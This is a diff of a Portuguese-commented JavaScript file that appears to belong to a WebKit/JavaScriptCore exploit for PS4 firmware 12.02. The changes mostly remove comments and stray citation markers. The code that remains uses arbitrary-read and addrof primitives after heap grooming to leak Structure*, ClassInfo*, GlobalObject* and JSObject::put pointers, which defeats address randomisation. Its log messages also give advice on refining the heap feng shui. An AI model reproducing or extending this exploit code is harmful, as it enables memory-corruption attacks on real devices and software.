@@ -435,27 +408,25 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`  Falha na tentativa de vazamento com JSC::ClassInfo::m_cachedTypeInfo: ${classinfo_leak_e.message}`, "warn");
         }
 
-        // Se chegamos aqui, nenhuma das tentativas de vazamento foi bem-sucedida.
         throw new Error("Nenhuma estratégia de vazamento de WebKit foi bem-sucedida após Heap Grooming e testes múltiplos.");
 
     } catch (e) {
         final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
-        logS3(final_result.message, "critical"); [cite: 1]
+        logS3(final_result.message, "critical");
         final_result.success = false;
         final_result.webkit_leak_details.success = false;
         final_result.webkit_leak_details.msg = `Vazamento WebKit não foi possível devido a erro na fase anterior: ${e.message}`;
     }
 
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test"); [cite: 1]
-    // Se o vazamento WebKit não foi bem-sucedido, adiciona sugestão de depuração. 
+    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
     if (!final_result.webkit_leak_details.success) {
-        logS3("========== SUGESTÃO DE DEPURAGEM CRÍTICA ==========", "critical"); [cite: 1]
-        logS3("As primitivas de L/E estão funcionando, mas o vazamento do WebKit falhou consistentemente devido à leitura de valores de poluição.", "critical"); [cite: 1]
-        logS3("Isso indica um problema de reutilização de heap ou alocação previsível no PS4 12.02, que o Heap Feng Shui não conseguiu contornar.", "critical"); [cite: 1]
-        logS3("RECOMENDAÇÃO: Com o depurador inacessível, a estratégia é iterar em técnicas mais variadas de Heap Grooming e fontes de vazamento.", "critical"); [cite: 1]
-        logS3("Concentre-se em: 1) Mais variação de alocações/liberações no grooming. 2) Vazamento de m_data de TypedArray. 3) Vazamento de endereços de funções nativas JS (JSCFunction/Executable).", "critical"); [cite: 1]
-        logS3("É crucial tentar entender o layout do heap através de padrões de sucesso/falha e ajustar os tamanhos de alocação.", "critical"); [cite: 1]
-        logS3("======================================================", "critical"); [cite: 1]
+        logS3("========== SUGESTÃO DE DEPURAGEM CRÍTICA ==========", "critical");
+        logS3("As primitivas de L/E estão funcionando, mas o vazamento do WebKit falhou consistentemente devido à leitura de valores de poluição.", "critical");
+        logS3("Isso indica um problema de reutilização de heap ou alocação previsível no PS4 12.02, que o Heap Feng Shui não conseguiu contornar.", "critical");
+        logS3("RECOMENDAÇÃO: Com o depurador inacessível, a estratégia é iterar em técnicas mais variadas de Heap Grooming e fontes de vazamento.", "critical");
+        logS3("Concentre-se em: 1) Mais variação de alocações/liberações no grooming. 2) Vazamento de m_data de TypedArray. 3) Vazamento de endereços de funções nativas JS (JSCFunction/Executable).", "critical");
+        logS3("É crucial tentar entender o layout do heap através de padrões de sucesso/falha e ajustar os tamanhos de alocação.", "critical");
+        logS3("======================================================", "critical");
     }
 
     return {
@@ -470,7 +441,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
 // =======================================================================================
 // Função Auxiliar para tentar vazamento a partir da Structure de um objeto dado
-// (Mantida para tentativas de Structure*, mas foco nas novas estratégias)
 // =======================================================================================
 async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, arb_read_func, final_result_ref, pollution_value) {
     logS3(`  Iniciando leituras da JSCell/Structure do objeto de vazamento tipo "${obj_type_name}"...`, "debug");
@@ -481,12 +451,10 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const structure_addr = arb_read_func(jscell_structure_ptr_addr);
         logS3(`    Lido Structure* (${JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET}): ${structure_addr.toString(true)} de ${jscell_structure_ptr_addr.toString(true)}`, "leak");
         
-        // Verificação de poluição para Structure*
         if (structure_addr.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: Structure* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("Structure* poluído.");
         }
-        // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
         if (structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
             throw new Error("Falha ao vazar Structure* (endereço é 0x0 ou NaN).");
         }
@@ -495,7 +463,6 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const structure_id_flattened_val = arb_read_func(obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET));
         const structure_id_byte = structure_id_flattened_val.low() & 0xFF;
         logS3(`    Lido StructureID_Flattened (${JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET).toString(true)} (Valor Full: ${structure_id_flattened_val.toString(true)})`, "leak");
-        // Verificação de poluição para StructureID
         if (structure_id_flattened_val.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: StructureID_Flattened está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("StructureID_Flattened poluído.");
@@ -515,7 +482,6 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const typeinfo_type_flattened_val = arb_read_func(obj_addr.add(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET));
         const typeinfo_type_byte = typeinfo_type_flattened_val.low() & 0xFF;
         logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${obj_addr.add(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET).toString(true)} (Valor Full: ${typeinfo_type_flattened_val.toString(true)})`, "leak");
-        // Verificação de poluição para TypeInfoType
         if (typeinfo_type_flattened_val.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: CELL_TYPEINFO_TYPE_FLATTENED está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("CELL_TYPEINFO_TYPE_FLATTENED poluído.");
@@ -529,12 +495,10 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const class_info_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
         const class_info_addr = arb_read_func(class_info_ptr_addr);
         logS3(`    Lido ClassInfo* (${JSC_OFFSETS.Structure.CLASS_INFO_OFFSET}): ${class_info_addr.toString(true)} de ${class_info_ptr_addr.toString(true)}`, "leak");
-        // Verificação de poluição para ClassInfo*
         if (class_info_addr.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: ClassInfo* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("ClassInfo* poluído.");
         }
-        // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
         if (class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
             throw new Error("Falha ao vazar ClassInfo* (endereço é 0x0 ou NaN).");
         }
@@ -543,29 +507,24 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const global_object_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.GLOBAL_OBJECT_OFFSET);
         const global_object_addr = arb_read_func(global_object_ptr_addr);
         logS3(`    Lido GlobalObject* (${JSC_OFFSETS.Structure.GLOBAL_OBJECT_OFFSET}): ${global_object_addr.toString(true)} de ${global_object_ptr_addr.toString(true)}`, "leak");
-        // Verificação de poluição para GlobalObject*
         if (global_object_addr.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: GlobalObject* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("GlobalObject* poluído.");
         }
-        // CORREÇÃO: Usar .equals() para comparação com Zero
         if (global_object_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: GlobalObject* é 0x0.`, "warn");
 
         const prototype_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.PROTOTYPE_OFFSET);
         const prototype_addr = arb_read_func(prototype_ptr_addr);
         logS3(`    Lido Prototype* (${JSC_OFFSETS.Structure.PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
-        // Verificação de poluição para Prototype*
         if (prototype_addr.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: Prototype* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("Prototype* poluído.");
         }
-        // CORREÇÃO: Usar .equals() para comparação com Zero
         if (prototype_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: Prototype* é 0x0.`, "warn");
 
         const aggregated_flags_addr = structure_addr.add(JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET);
         const aggregated_flags_val = arb_read_func(aggregated_flags_addr);
         logS3(`    Lido AGGREGATED_FLAGS (${JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak");
-        // Verificação de poluição para AggregatedFlags
         if (aggregated_flags_val.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: AGGREGATED_FLAGS está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("AGGREGATED_FLAGS poluído.");
@@ -579,12 +538,10 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         const js_object_put_func_addr = arb_read_func(js_object_put_func_ptr_addr_in_structure);
         logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");
 
-        // Verificação de poluição para JSC::JSObject::put
         if (js_object_put_func_addr.equals(pollution_value)) {
             logS3(`    ALERTA DE POLUIÇÃO: JSC::JSObject::put está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("JSC::JSObject::put poluído.");
         }
-        // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
         if (js_object_put_func_addr.equals(AdvancedInt64.Zero) || js_object_put_func_addr.equals(AdvancedInt64.NaNValue)) {
              throw new Error("Falha ao vazar ponteiro para JSC::JSObject::put (endereço é 0x0 ou NaN).");
         }
